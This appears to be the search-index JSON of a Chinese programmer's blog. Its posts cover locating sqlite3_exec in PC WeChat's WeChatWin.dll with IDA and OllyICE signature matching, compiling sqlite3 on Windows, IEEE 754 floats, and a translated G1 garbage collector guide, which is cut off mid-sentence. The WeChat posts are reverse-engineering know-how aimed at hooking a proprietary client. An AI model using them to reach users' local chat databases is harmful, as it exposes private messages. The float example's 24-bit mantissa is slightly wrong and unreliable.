{"meta":{"title":"xxzkid | 我叫王也道长","subtitle":null,"description":"喜欢写一点代码，喜欢折腾 --xxzkid | 我叫王也道长","author":"xxzkid | 我叫王也道长","url":"https://xxzkid.github.io"},"pages":[{"title":"","date":"2024-04-30T05:28:28.491Z","updated":"2024-04-30T05:28:28.491Z","comments":true,"path":"404.html","permalink":"https://xxzkid.github.io/404.html","excerpt":"","text":""},{"title":"分类","date":"2024-04-30T05:28:28.495Z","updated":"2024-04-30T05:28:28.495Z","comments":true,"path":"categories/index.html","permalink":"https://xxzkid.github.io/categories/index.html","excerpt":"","text":""},{"title":"标签","date":"2024-04-30T05:28:30.147Z","updated":"2024-04-30T05:28:30.147Z","comments":true,"path":"tags/index.html","permalink":"https://xxzkid.github.io/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"IDA定位PC微信sqlite3_exec","slug":"ida-sqlite3-exec","date":"2024-04-30T08:00:00.000Z","updated":"2024-04-30T05:28:28.491Z","comments":true,"path":"2024/ida-sqlite3-exec/","link":"","permalink":"https://xxzkid.github.io/2024/ida-sqlite3-exec/","excerpt":"IDA定位PC微信sqlite3_exec 定位自己写的程序","text":"IDA定位PC微信sqlite3_exec 定位自己写的程序 开始找wechat的sqlite3_exec 思路 所有的数据库执行都必须要先创建数据库，那我们先看从创建数据库SQL开始找 1create table if not exists ... CTRL + F 鼠标放在黄色区域 按下x 看call sub_10F20BF0 双击进去看看是怎么样的 可以看到sqlite3_exec函数的结构 sub_11E24F70 就是sqlite3_exec函数 结论： 10000000 是我的IDA的基址 偏移 11E24F70 - 10000000 = 1E24F70","categories":[{"name":"c","slug":"c","permalink":"https://xxzkid.github.io/categories/c/"}],"tags":[{"name":"c/c++","slug":"c-c","permalink":"https://xxzkid.github.io/tags/c-c/"},{"name":"微信","slug":"微信","permalink":"https://xxzkid.github.io/tags/微信/"},{"name":"PC微信","slug":"PC微信","permalink":"https://xxzkid.github.io/tags/PC微信/"}]},{"title":"OllyICE_1.10 调试sqlite3","slug":"ollyice-debug-sqlite3","date":"2024-04-27T09:00:00.000Z","updated":"2024-04-30T05:28:28.495Z","comments":true,"path":"2024/ollyice-debug-sqlite3/","link":"","permalink":"https://xxzkid.github.io/2024/ollyice-debug-sqlite3/","excerpt":"OllyICE_1.10 调试sqlite3 下载 OllyICE https://tool.kanxue.com/index-detail-1.htm 下载 IDA https://tool.kanxue.com/index-detail-6.htm","text":"OllyICE_1.10 调试sqlite3 下载 OllyICE https://tool.kanxue.com/index-detail-1.htm 下载 IDA https://tool.kanxue.com/index-detail-6.htm 根据windows cpp编译sqlite3 生成的程序 打开OllyICEFile -》 Open -》选择sqlitetest.exe CTRL+G 输入sqlite3_open 可以看到特征码12345678910007FE2F0 &gt;/$ 55 push ebp007FE2F1 |. 8BEC mov ebp, esp007FE2F3 |. 8B55 0C mov edx, dword ptr [ebp+C]007FE2F6 |. 8B4D 08 mov ecx, dword ptr [ebp+8]007FE2F9 |. 6A 00 push 0007FE2FB |. 6A 06 push 6007FE2FD |. E8 CEFBFFFF call openDatabase007FE302 |. 83C4 08 add esp, 8007FE305 |. 5D pop ebp007FE306 \\. C3 retn 18B 4D 08 6A 00 6A 06 E8 接下来我们分析微信的dll 找到微信的安装目录 C:\\Program Files (x86)\\Tencent\\WeChat 找到版本目录下面的WeChatWin.dll 拷贝一份到D:\\debug\\WeChatWin.dll 我们打开IDANew -》 选择D:\\debug\\WeChatWin.dll ALT + b 双击进入 可以看到跟sqlitetest一样的代码 到这里我们就发现如何找特征码了","categories":[{"name":"c","slug":"c","permalink":"https://xxzkid.github.io/categories/c/"}],"tags":[{"name":"c/c++","slug":"c-c","permalink":"https://xxzkid.github.io/tags/c-c/"},{"name":"微信","slug":"微信","permalink":"https://xxzkid.github.io/tags/微信/"},{"name":"PC微信","slug":"PC微信","permalink":"https://xxzkid.github.io/tags/PC微信/"},{"name":"微信机器人","slug":"微信机器人","permalink":"https://xxzkid.github.io/tags/微信机器人/"}]},{"title":"window编译sqlite3","slug":"window-cpp-compile-sqlite3","date":"2024-04-27T08:00:00.000Z","updated":"2024-04-30T05:28:28.495Z","comments":true,"path":"2024/window-cpp-compile-sqlite3/","link":"","permalink":"https://xxzkid.github.io/2024/window-cpp-compile-sqlite3/","excerpt":"windows cpp 编译sqlite3","text":"windows cpp 编译sqlite3 下载 https://www.sqlite.org/2019/sqlite-preprocessed-3280000.zip解压D:\\sqlite-preprocessed-3280000 把.c和.h文件分离，创建一个include文件夹用来存放.h文件 打开visual studio 2017 创建一个c++控制台项目 名称：sqlitetest 添加头文件 解决方案资源管理器 -》头文件 -》 右键 -》添加 -》现有项 选中include中所有的.h文件 添加.c文件 解决方案资源管理器 -》源文件 -》 右键 -》添加 -》现有项 选中所有的.c文件 编译visual studio 菜单栏 -》项目 -》sqlitetest属性 配置：Release 配置属性 -》C/C++ -》常规 -》附加包含目录 -》点击编辑 点击带*的文件夹图标 -》点击… -》选中D:\\sqlite-preprocessed-3280000\\include 配置属性 -》C/C++ -》优化 -》内联函数扩展 -》已禁用 visual studio 工具栏 -》Debug 改成 Release visual studio 菜单栏 -》生成 -》生成解决方案 解决编译报错 找到sqlite3ext.h 在#define SQLITE3EXT_H 下一行添加 #define SQLITE_CORE 1 排除文件fts1.c, fts2.c, icu.c, tclsqlite.c, fts3_tokenizer.c 右键 -》从项目中排除 这样就可以编译成功了 编写测试代码 sqlitetest.cpp 123456789101112131415161718#include &lt;iostream&gt;#include &quot;sqlite3.h&quot;int create(sqlite3** db) &#123; int rc = sqlite3_open(&quot;test.db&quot;, db); std::string sql = &quot;create table if not exists test(name text)&quot;; rc = sqlite3_exec(*db, sql.c_str(), NULL, NULL, NULL); std::cout &lt;&lt; &quot;rc:&quot; &lt;&lt; rc &lt;&lt; &quot;\\n&quot;; return rc;&#125;int main()&#123; std::cout &lt;&lt; &quot;Hello World!\\n&quot;; sqlite3* db = NULL; int rc = create(&amp;db); return 0;&#125; visual studio 工具栏 -》 点击本地Windows调试器 会看到12Hello World!rc:0","categories":[{"name":"c","slug":"c","permalink":"https://xxzkid.github.io/categories/c/"}],"tags":[{"name":"c/c++","slug":"c-c","permalink":"https://xxzkid.github.io/tags/c-c/"},{"name":"微信","slug":"微信","permalink":"https://xxzkid.github.io/tags/微信/"},{"name":"PC微信","slug":"PC微信","permalink":"https://xxzkid.github.io/tags/PC微信/"},{"name":"微信机器人","slug":"微信机器人","permalink":"https://xxzkid.github.io/tags/微信机器人/"}]},{"title":"深入理解计算机浮点数存储","slug":"cs-float-store-1","date":"2022-09-28T09:19:54.000Z","updated":"2024-04-30T05:28:28.491Z","comments":true,"path":"2022/cs-float-store-1/","link":"","permalink":"https://xxzkid.github.io/2022/cs-float-store-1/","excerpt":"深入理解计算机浮点数存储 根据IEEE 754 浮点标准12345V = (-1)^s * M * 2^Es: 符号 s决定这数是负数(s=1)还是正数(s=0)M: 尾数 M是一个二进制小数E: 阶码 E的作用是对浮点数加权，这个权重是2的E次幂","text":"深入理解计算机浮点数存储 根据IEEE 754 浮点标准12345V = (-1)^s * M * 2^Es: 符号 s决定这数是负数(s=1)还是正数(s=0)M: 尾数 M是一个二进制小数E: 阶码 E的作用是对浮点数加权，这个权重是2的E次幂 1234567891011单精度表示+---------+----------------+------------------------+| s | E | M |+---------+----------------+------------------------+ 1 8 23双精度+---------+----------------+------------------------+| s | E | M |+---------+----------------+------------------------+ 1 11 52 根据十进制数计算二进制1234567891011121314151617181920212223244.25 单精度二进制如何表示表示方法: 整数部分二进制.小数部分二进制整数部分二进制如何计算：整数部分除以2取模得到二进制数，得到的整数部分继续除以2取模，直到除以2等于0结束，取模所得整数位继续向左添加。12=&gt; 12 / 2 = 6, 12 % 2 = 0=&gt; 6 / 2 = 3, 6 % 2 = 0=&gt; 3 / 2 = 1, 3 % 2 = 1=&gt; 1 / 2 = 0, 1 % 2 = 1=&gt; 1100小数部分二进制如何计算：将十进制的小数部分乘2，将所得结果的整数位作为二进制的位。舍弃乘2所得结果的整数部分，如果剩余部分为0，计算结束。否则继续乘2，进行取整操作（所得整数位继续向右添加）0.25=&gt; 0.25 * 2 = 0.5=&gt; 0.5 * 2 = 1.0=&gt; 0.01=&gt; 0100.01=&gt; 1.0001 * 2^2=&gt; s = 0, E = 2 + 127, M=000100000000000000000000 (隐藏了整数部分1.)=&gt; E = 129 =&gt; 10000001完整表示：0 10000001 000100000000000000000000 根据二进制计算十进制数12345678910111213140 10000001 00010000000000000000000010000001=&gt; 1 * 2^7 + 0 * 2^6 + 0 * 2^5 + 0 * 2^4 + 0 * 2^3 + 0 * 2^2 + 0 * 2^1 + 1 * 2^0=&gt; 128 + 0 + 0 + 0 + 0 + 0 + 0 + 1=&gt; 129000100000000000000000000=&gt; 0 * 2^-1 + 0 * 2^-2 + 0 * 2^-3 + 1 * 2^-4=&gt; 0.0625=&gt; -1^0 * (1 + 0.0625) * 2^(129 - 127)=&gt; 1 * 1.0625 * 4=&gt; 4.25","categories":[{"name":"c","slug":"c","permalink":"https://xxzkid.github.io/categories/c/"}],"tags":[{"name":"java","slug":"java","permalink":"https://xxzkid.github.io/tags/java/"},{"name":"c","slug":"c","permalink":"https://xxzkid.github.io/tags/c/"}]},{"title":"G1 垃圾收集器","slug":"java-g1","date":"2022-07-23T00:00:00.000Z","updated":"2024-04-30T05:28:28.491Z","comments":true,"path":"2022/java-g1/","link":"","permalink":"https://xxzkid.github.io/2022/java-g1/","excerpt":"G1 垃圾收集器Garbage-First (G1) 收集器是一种服务器式垃圾收集器，针对具有大内存的多处理器机器。它以高概率满足垃圾收集 (GC) 暂停时间目标，同时实现高吞吐量。 Oracle JDK 7 update 4 及更高版本完全支持 G1 垃圾收集器。 G1 收集器专为以下应用而设计： 可以与 CMS 收集器等应用程序线程同时操作。 紧凑的可用空间，没有冗长的 GC 引起的暂停时间。 需要更多可预测的 GC 暂停持续时间。 不想牺牲很多吞吐量性能。 不需要更大的 Java 堆。","text":"G1 垃圾收集器Garbage-First (G1) 收集器是一种服务器式垃圾收集器，针对具有大内存的多处理器机器。它以高概率满足垃圾收集 (GC) 暂停时间目标，同时实现高吞吐量。 Oracle JDK 7 update 4 及更高版本完全支持 G1 垃圾收集器。 G1 收集器专为以下应用而设计： 可以与 CMS 收集器等应用程序线程同时操作。 紧凑的可用空间，没有冗长的 GC 引起的暂停时间。 需要更多可预测的 GC 暂停持续时间。 不想牺牲很多吞吐量性能。 不需要更大的 Java 堆。 G1 计划作为 Concurrent Mark-Sweep Collector (CMS) 的长期替代品。将 G1 与 CMS 进行比较，G1 是一个更好的解决方案。一个区别是 G1 是一个压缩收集器。 G1 充分压缩以完全避免使用细粒度的空闲列表进行分配，而是依赖于区域。这大大简化了收集器的各个部分，并且主要消除了潜在的碎片问题。此外，G1 提供比 CMS 收集器更可预测的垃圾收集暂停，并允许用户指定所需的暂停目标。 G1运行概览较旧的垃圾收集器（串行(serial)、并行(parallel)、CMS）都将堆分为三个部分：年轻代、老年代和固定内存大小的永久代。 所有内存对象最终都位于这三个部分之一中。 G1 收集器采用不同的方法。堆被划分为一组大小相等的堆区域，每个区域都是连续的虚拟内存范围。某些区域集被分配了与旧收集器相同的角色（eden、survivor、old），但它们没有固定的大小。这为内存使用提供了更大的灵活性。 在执行垃圾回收时，G1 以类似于 CMS 回收器的方式运行。 G1 执行一个并发的全局标记阶段来确定整个堆中对象的活跃度。标记阶段完成后，G1 知道哪些区域大部分是空的。它首先在这些区域收集，这通常会产生大量的可用空间。这就是为什么这种垃圾收集方法被称为 Garbage-First 的原因。顾名思义，G1 将其收集和压缩活动集中在堆中可能充满可回收对象的区域，即垃圾。 G1 使用停顿预测模型来满足用户定义的停顿时间目标，并根据指定的停顿时间目标选择要收集的区域数。 G1 识别为可以回收的区域使用疏散进行垃圾收集。 G1 将对象从堆的一个或多个区域复制到堆上的单个区域，并在此过程中压缩和释放内存。这种疏散在多处理器上并行执行，以减少暂停时间并提高吞吐量。因此，每次垃圾回收时，G1 都会在用户定义的暂停时间内持续工作以减少碎片。这超出了前两种方法的能力。 CMS（并发标记扫描）垃圾收集器不进行压缩。 ParallelOld 垃圾收集仅执行整个堆压缩，这会导致相当长的暂停时间。 需要注意的是，G1 不是实时收集器。它以高概率但不是绝对确定地满足设定的暂停时间目标。根据之前收集的数据，G1 会估计在用户指定的目标时间内可以收集多少个区域。因此，收集器有一个相当准确的区域收集成本模型，并且它使用该模型来确定要收集哪些区域以及要收集多少区域，同时保持在暂停时间目标内。 注意：G1 具有并发（与应用程序线程一起运行，例如，细化(refinement)、标记(marking)、清理(cleanup)）和并行（多线程，例如，STW）阶段。Full GC仍然是单线程的，但如果调整得当，您的应用程序应该避免Full GC。 G1足迹如果您从 ParallelOldGC 或 CMS 收集器迁移到 G1，您可能会看到更大的 JVM 进程大小。这主要与“记帐(accounting)”数据结构有关，例如记忆集(Remembered Sets)和集合集(Collection Sets)。 记忆集(Remembered Sets)或 RSets 将对象引用跟踪到给定区域。堆中的每个区域都有一个 RSet。RSet 支持区域的并行和独立收集。RSets 的总体足迹影响小于 5%。 Collection Sets 或 CSets 将在 GC 中收集的区域集。在 GC 期间，CSet 中的所有实时数据都会被撤出（复制/移动）。区域集可以是Eden、survivor 和/或 old generation。CSet 对 JVM 大小的影响不到 1%。 G1 的推荐用例G1 的第一个重点是为运行需要大堆且 GC 延迟有限的应用程序的用户提供解决方案。这意味着大约 6GB 或更大的堆大小，以及低于 0.5 秒的稳定且可预测的暂停时间。 如果应用程序具有以下一个或多个特征，则现在使用 CMS 或 ParallelOldGC 垃圾收集器运行的应用程序将受益于切换到 G1。 Full GC 持续时间太长或太频繁。 对象分配率或提升率差异很大。 不需要的长时间垃圾收集或压缩暂停（超过 0.5 到 1 秒） 注意：如果您使用的是 CMS 或 ParallelOldGC，并且您的应用程序没有经历长时间的垃圾收集暂停，则可以继续使用当前的收集器。使用最新的 JDK 不需要更改为 G1 收集器。 使用 CMS 查看 GC查看分代 GC 和 CMSConcurrent Mark Sweep (CMS) 收集器（也称为并发低暂停收集器）收集tenured generation。它试图通过与应用程序线程同时进行大部分垃圾收集工作来最小化由于垃圾收集而导致的暂停。通常并发低暂停收集器不会复制或压缩活动对象。垃圾收集是在不移动活动对象的情况下完成的。如果碎片成为问题，请分配更大的堆。 注意：年轻代的 CMS 收集器使用与并行收集器相同的算法。 CMS 收集阶段CMS 收集器在老年代堆上执行以下阶段：| 阶段 | 描述 || — | — || (1) 初始标记 STW | 老一代中的对象被“标记”为可访问的，包括那些可以从年轻代访问的对象。与Minor收集暂停时间相比，暂停时间通常较短。 || (2) 并发标记 | 在 Java 应用程序线程正在执行时，同时遍历可访问对象的永久生成对象图。从标记的对象开始扫描并传递标记从根可到达的所有对象。 mutator 在并发阶段 2、3 和 5 期间执行，并且在这些阶段期间在 CMS 生成中分配的任何对象（包括提升的对象）都会立即标记为活动的。 || (3)重新标记 STW | 在并发收集器完成跟踪该对象后，查找由于 Java 应用程序线程更新对象而被并发标记阶段遗漏的对象。 || (4)并发清楚 | 在标记阶段收集标识为无法访问的对象。死对象的集合将对象的空间添加到空闲列表以供以后分配。此时可能会发生死对象的合并。请注意，活动对象不会移动。 || (5) 复位 | 通过清除数据结构为下一次并发收集做准备。 | 查看垃圾收集步骤接下来，让我们一步步回顾CMS Collector的操作。 CMS 收集器的堆结构堆被分成三个空间。 年轻代分为Eden和两个survivor空间。老年代是一个连续的空间。对象收集就地完成。除非有Full GC，否则不会进行压缩。 Young GC 在 CMS 中的工作原理新生代为浅绿色，老年代为蓝色。如果您的应用程序已经运行了一段时间，这就是 CMS 的样子。对象分散在老年代区域周围。 使用 CMS，老年代对象被原地释放。他们没有四处移动。除非有Full GC，否则不会压缩空间。 年轻一代合集活动对象从Eden空间和survivor空间复制到另一个survivor空间。任何达到其老化阈值的旧对象都会被提升为老年代。 在年轻 GC 之后在年轻 GC 之后，Eden 空间被清除，survivor空间之一被清除。 新提升的对象在图表上以深蓝色显示。绿色对象是尚未提升到老年代的幸存年轻代对象。 带有 CMS 的老一代集合两个STW事件发生：初始标记和备注。当老年代达到一定的占用率时，CMS就会启动。(1) 初始标记是一个短暂的暂停阶段，在此标记活动（可达）对象。(2) 并发标记在应用程序继续执行时发现活动对象。最后，在（3）重新标记阶段，发现在前一个阶段（2）并发标记期间遗漏的对象。 老年代收集 - 并发清除在前一阶段未标记的对象将被原地释放。没有压缩 。 注意：未标记的对象 == 死对象 老一代合集-清除后（4）清除阶段之后，可以看到已经释放了很多内存。您还会注意到没有进行任何压缩。 最后，CMS 收集器将通过 (5) 重置阶段并等待下一次达到 GC 阈值。 G1 垃圾收集器一步一步G1 收集器采用不同的方法来分配堆。下面的图片逐步回顾了 G1 系统。 G1 堆结构堆是一个内存区域，分为许多固定大小的区域。区域大小由 JVM 在启动时选择。 JVM 通常针对大约 2000 个区域，大小从 1 到 32Mb 不等。 G1 堆分配实际上，这些区域被映射为 Eden、Survivor 和老年代空间的逻辑表示。 图片中的颜色显示了哪个区域与哪个角色相关联。活动对象从一个区域撤离（即复制或移动）到另一个区域。区域被设计为在停止或不停止所有其他应用程序线程的情况下并行收集。 如图所示，区域可以分配到 Eden、Survivor 和老年代区域。此外，还有第四类物体，称为巨大区域(Humongous regions)。这些区域旨在容纳标准区域大小的 50% 或更大的对象。它们被存储为一组连续的区域。最后一种类型的区域将是堆中未使用的区域。 注意：在撰写本文时，收集巨大对象尚未优化。因此，您应该避免创建这种大小的对象。 G1 中的年轻代堆被分成大约 2000 个区域。最小大小为 1Mb，最大大小为 32Mb。蓝色区域保存老年代对象，绿色区域保存年轻代对象。 请注意，这些区域不需要像旧的垃圾收集器那样是连续的。 G1 中的Young GC活动对象被疏散（即复制或移动）到一个或多个幸存者区域。如果满足老化阈值，则将一些对象提升到老年代区域。 这是一个STW的暂停。为下一次Young GC 计算 Eden 大小和Survivor 大小。保留会计信息以帮助计算大小。考虑到暂停时间目标之类的事情。 使用 G1 结束 Young GC活动对象已被疏散到Survivor区域或老年代区域。 最近提升的对象以深蓝色显示。绿色的Survivor区域。 综上所述，G1中的年轻代可以这么说： 堆是分割成多个区域的单个内存空间。 年轻代内存由一组不连续的区域组成。这使得在需要时可以轻松调整大小。 年轻代垃圾回收或Young GC 是STW事件。所有应用程序线程都为该操作停止。 Young GC 使用多个线程并行完成。 活动对象被复制到新的Survivor或老年代区域。 带有 G1 的老年代集合与 CMS 收集器一样，G1 收集器被设计为老年代对象的低暂停收集器。下表描述了老年代的 G1 收集阶段。 G1 收集阶段 - 并发标记周期阶段G1 收集器在堆的老年代执行以下阶段。请注意，某些阶段是年轻代集合的一部分。 阶段 描述 (1) 初始标记 这是一个STW事件。使用 G1，它搭载在正常的Young GC 上。标记可能引用老年代对象的Survivor区域（根区域）。 (2) 根区域扫描 扫描Survivor区域以获取对老年代的引用。这会在应用程序继续运行时发生。该阶段必须在Young GC 发生之前完成。 (3) 并发标记 在整个堆上查找活动对象。这发生在应用程序运行时。这个阶段可以被年轻代垃圾回收打断。 (4) 重新标记 (STW) 完成堆中活动对象的标记。使用一种称为开始时快照 (SATB) 的算法，该算法比 CMS 收集器中使用的算法快得多。 (5) 清除 (STW和并发) 1. 对活动对象和完全自由的区域执行记帐(accounting)。 （STW）2. 清除记忆的集合。 （STW）3. 重置空白区域并将它们返回到空闲列表。 （并发） (*) 复制 (STW) 这些是STW以将活动对象撤离或复制到新的未使用区域的停止。这可以通过记录为 [GC pause (young)] 的年轻代区域来完成。或者记录为 [GC Pause (mixed)] 的年轻代和老年代区域。 G1老年代收集一步一步定义完阶段后，让我们看看它们如何与 G1 收集器中的老年代交互。 初始标记阶段活动对象的初始标记搭载在年轻代垃圾收集上。在日志中，这被标记为 GC pause (young)(initial-mark)。 并发标记阶段如果找到空区域（如“X”所示），它们会在重新标记阶段立即删除。此外，计算确定活跃度的“记账(accounting)”信息。 重新标记阶段空区域被移除并回收。现在计算所有区域的区域活跃度。 复制/清理阶段G1 选择“活跃度”最低的区域，即可以最快收集到的区域。然后这些区域会在Young GC 的同时被收集。这在日志中表示为 [GC pause (mixed)]。所以年轻一代和老一代同时被收集。 复制/清理阶段之后所选区域已被收集并压缩为图中所示的深蓝色区域和深绿色区域。 老年代GC总结综上所述，关于老年代的 G1 垃圾回收，我们可以提出几个关键点。 并发标记阶段 在应用程序运行时同时计算活跃度信息。 该活跃度信息确定了在撤离暂停期间哪些区域最适合回收。 没有像 CMS 那样的清扫阶段。 重新标记阶段 使用 Snapshot-at-the-Beginning (SATB) 算法，该算法比 CMS 使用的要快得多。 完全空的区域被回收。 复制/清理阶段 年轻代和老年代同时回收。 老年代区域是根据它们的活跃度来选择的。 命令行选项和最佳实践在本节中，让我们看一下 G1 的各种命令行选项。 基本命令行要启用 G1 收集器，请使用：-XX:+UseG1GC 以下是用于启动 JDK 演示和示例下载中包含的 Java2Demo 的示例命令行：java -Xmx50m -Xms50m -XX:+UseG1GC -XX:MaxGCPauseMillis=200 -jar c:\\javademos\\demo\\jfc\\Java2D\\Java2demo.jar 关键命令行开关-XX:+UseG1GC - 告诉 JVM 使用 G1 垃圾收集器。 -XX:MaxGCPauseMillis=200 - 设置最大 GC 暂停时间的目标。这是一个软目标，JVM 将尽最大努力实现它。因此，暂停时间目标有时无法实现。默认值为 200 毫秒。 -XX:InitiatingHeapOccupancyPercent=45 - 启动并发 GC 周期的（整个）堆占用百分比。 G1 使用它来触发基于整个堆的占用情况的并发 GC 周期，而不仅仅是一代。值 0 表示“执行恒定的 GC 循环”。默认值为 45（即 45% 已满或已占用）。 最佳实践在使用 G1 时，您应该遵循一些最佳实践。 不要设置年轻代大小通过 -Xmn 显式设置年轻代大小会影响 G1 收集器的默认行为。 G1 将不再遵守集合的暂停时间目标。所以本质上，设置年轻代大小会禁用暂停时间目标。 G1 不再能够根据需要扩展和收缩年轻代空间。由于大小是固定的，因此无法更改大小。 响应时间指标不要使用平均响应时间 (ART) 作为设置 XX:MaxGCPauseMillis= 的指标，而是考虑设置将在 90% 或更多时间内满足目标的值。这意味着 90% 的发出请求的用户不会遇到高于目标的响应时间。请记住，暂停时间是一个目标，不能保证总是能达到。 什么是疏散失败？当 JVM 在 GC 期间为幸存者和提升对象用完堆区域时发生提升失败。堆无法扩展，因为它已经达到最大值。这在使用 -XX:+PrintGCDetails 时通过 to-space 溢出在 GC 日志中指示。这很贵！ GC 仍然必须继续，因此必须释放空间。 未成功复制的对象必须在适当的位置进行永久保存。 必须重新生成对 CSet 中区域 RSet 的任何更新。 所有这些步骤都是昂贵的。 如何避免疏散失败为避免疏散失败，请考虑以下选项。 增加堆大小 增加-XX:G1ReservePercent=n，默认为10。 G1 通过尝试让保留内存空闲以防需要更多“to-space”来创建假天花板。 提前开始标记周期 使用 -XX:ConcGCThreads=n 选项增加标记线程的数量。 G1 GC 开关的完整列表这是 G1 GC 开关的完整列表。请记住使用上述最佳实践。| 选项和默认值 | 描述 || — | — || -XX:+UseG1GC | 使用垃圾优先 (G1) 收集器 || -XX:MaxGCPauseMillis=n | 设置最大 GC 暂停时间的目标。这是一个软目标，JVM 将尽最大努力实现它。 || -XX:InitiatingHeapOccupancyPercent=n | 启动并发 GC 周期的（整个）堆占用百分比。它被 GC 使用，这些 GC 根据整个堆的占用情况触发并发 GC 周期，而不仅仅是一代（例如 G1）。值 0 表示“执行恒定的 GC 循环”。默认值为 45。 || -XX:NewRatio=n | 新/旧代大小的比率。默认值为 2。 || -XX:SurvivorRatio=n | Eden/Survivor空间大小的比率。默认值为 8。 || -XX:MaxTenuringThreshold=n | 任期阈值的最大值。默认值为 15。 || -XX:ParallelGCThreads=n | 设置在垃圾收集器的并行阶段使用的线程数。默认值随运行 JVM 的平台而异。 || -XX:ConcGCThreads=n | 并发垃圾收集器将使用的线程数。默认值随运行 JVM 的平台而异。 || -XX:G1ReservePercent=n | 将保留的堆数量设置为错误上限，以减少升级失败的可能性。默认值为 10。 || -XX:G1HeapRegionSize=n | 在 G1 中，Java 堆被细分为大小一致的区域。这设置了各个细分的大小。此参数的默认值是根据堆大小以符合人体工程学的方式确定的。最小值为 1Mb，最大值为 32Mb。 | 使用 G1 记录 GC我们需要讨论的最后一个主题是使用日志信息来分析 G1 收集器的性能。本节简要概述了可用于收集数据的开关以及打印在日志中的信息。 设置日志详细信息您可以将详细信息设置为三个不同的详细信息级别。 (1) -verbosegc（相当于-XX:+PrintGC）将日志的详细级别设置为fine。样本输出12[GC pause (G1 Humongous Allocation) (young) (initial-mark) 24M- &gt;21M(64M), 0.2349730 secs][GC pause (G1 Evacuation Pause) (mixed) 66M-&gt;21M(236M), 0.1625268 secs] (2) -XX:+PrintGCDetails 设置细节级别finer。选项显示以下信息： 显示每个阶段的平均、最小和最大时间。 根扫描、RSet 更新（带有已处理的缓冲区信息）、RSet 扫描、对象复制、终止（带有尝试次数）。 还显示“其他”时间，例如选择 CSet、引用处理、引用入队和释放 CSet 所花费的时间。 显示 Eden、Survivors 和 Total Heap 占用。 样本输出12[Ext Root Scanning (ms): Avg: 1.7 Min: 0.0 Max: 3.7 Diff: 3.7][Eden: 818M(818M)-&gt;0B(714M) Survivors: 0B-&gt;104M Heap: 836M(4096M)-&gt;409M(4096M)] (3) -XX:+UnlockExperimentalVMOptions -XX:G1LogLevel=finest 将细节级别设置为finest。像finer，但包括单独的工作线程信息。123456[Ext Root Scanning (ms): 2.1 2.4 2.0 0.0 Avg: 1.6 Min: 0.0 Max: 2.4 Diff: 2.3] [Update RS (ms): 0.4 0.2 0.4 0.0 Avg: 0.2 Min: 0.0 Max: 0.4 Diff: 0.4] [Processed Buffers : 5 1 10 0 Sum: 16, Avg: 4, Min: 0, Max: 10, Diff: 10] 确定时间几个开关决定了时间在 GC 日志中的显示方式。(1) -XX:+PrintGCTimeStamps - 显示自 JVM 启动以来经过的时间。样本输出11.729: [GC pause (young) 46M-&gt;35M(1332M), 0.0310029 secs] (2) -XX:+PrintGCDateStamps - 为每个条目添加时间前缀。12012-05-02T11:16:32.057+0200: [GC pause (young) 46M-&gt;35M(1332M), 0.0317225 secs] 了解 G1 日志为了理解日志，本节定义了一些使用实际 GC 日志输出的术语。以下示例显示了日志的输出以及您将在其中找到的术语和值的解释。 G1 记录术语索引Clear CTCSetExternal Root ScanningFree CSetGC Worker EndGC Worker OtherObject CopyOtherParallel TimeRef EngRef ProcScanning Remembered SetsTermination TimeUpdate Remembered SetWorker Start Parallel Time1234567414.557: [GC pause (young), 0.03039600 secs] [Parallel Time: 22.9 ms][GC Worker Start (ms): 7096.0 7096.0 7096.1 7096.1 706.1 7096.1 7096.1 7096.1 7096.2 7096.2 7096.2 7096.2 Avg: 7096.1, Min: 7096.0, Max: 7096.2, Diff: 0.2]Parallel Time – 暂停的主要并行部分的总经过时间Worker Start – 工作开始的时间戳注意：日志按线程 id 排序，并且在每个条目上都是一致的 External Root Scanning1234[Ext Root Scanning (ms): 3.1 3.4 3.4 3.0 4.2 2.0 3.6 3.2 3.4 7.7 3.7 4.4 Avg: 3.8, Min: 2.0, Max: 7.7, Diff: 5.7]External root scanning - 扫描外部根所花费的时间（例如，指向堆的系统字典之类的东西。） Update Remembered Set1234[Update RS (ms): 0.1 0.0 0.0 0.0 0.0 0.0 0.0 0.0 0.0 0.0 0.0 0.0 Avg: 0.0, Min: 0.0, Max: 0.1, Diff: 0.1] [Processed Buffers : 26 0 0 0 0 0 0 0 0 0 0 0 Sum: 26, Avg: 2, Min: 0, Max: 26, Diff: 26]Update Remembered Set - 必须更新在暂停开始之前已完成但尚未由并发细化线程处理的任何缓冲区。时间取决于卡片的密度。卡越多，需要的时间就越长。 Scanning Remembered Sets123[Scan RS (ms): 0.4 0.2 0.1 0.3 0.0 0.0 0.1 0.2 0.0 0.1 0.0 0.0 Avg: 0.1, Min: 0.0, Max: 0.4, Diff: 0.3]FScanning Remembered Sets - 寻找指向集合集的指针。 Object Copy12[Object Copy (ms): 16.7 16.7 16.7 16.9 16.0 18.1 16.5 16.8 16.7 12.3 16.4 15.7 Avg: 16.3, Min: 12.3, Max: 18.1, Diff: 5.8]Object copy – 每个单独线程花费在复制和撤离对象的时间。 Termination Time1234[Termination (ms): 0.0 0.0 0.0 0.0 0.0 0.0 0.0 0.0 0.0 0.0 0.00.0 Avg: 0.0, Min: 0.0, Max: 0.0, Diff: 0.0] [Termination Attempts : 1 1 1 1 1 1 1 1 1 1 1 1 Sum: 12, Avg: 1, Min: 1, Max: 1, Diff: 0]Termination time - 当工作线程完成其要复制和扫描的特定对象集时，它进入终止协议。它寻找要窃取的工作，一旦完成该工作，它就会再次进入终止协议。终止尝试计算所有窃取工作的尝试。 GC Worker End1234567[GC Worker End (ms): 7116.4 7116.3 7116.4 7116.3 7116.4 7116.3 7116.4 7116.4 7116.4 7116.4 7116.3 7116.3 Avg: 7116.4, Min: 7116.3, Max: 7116.4, Diff: 0.1][GC Worker (ms): 20.4 20.3 20.3 20.2 20.3 20.2 20.2 20.2 20.3 20.2 20.1 20.1 Avg: 20.2, Min: 20.1, Max: 20.4, Diff: 0.3]GC worker end time – 单个 GC 工作停止时的时间戳。GC worker time – 单个 GC 工作线程花费的时间。 GC Worker Other1234[GC Worker Other (ms): 2.6 2.6 2.7 2.7 2.7 2.7 2.7 2.8 2.8 2.8 2.8 2.8 Avg: 2.7, Min: 2.6, Max: 2.8, Diff: 0.2]GC worker other – 不能归因于前面列出的工作阶段的时间（对于每个 GC 线程）。应该很低。过去，我们看到过高的值，它们被归因于 JVM 其他部分的瓶颈（例如，分层代码缓存占用率增加）。 Clear CT123[Clear CT: 0.6 ms]清除RSet扫描元数据卡表所用时间 Other123[Other: 6.8 ms]GC 暂停的各种其他顺序阶段所花费的时间。 CSet123[Choose CSet: 0.1 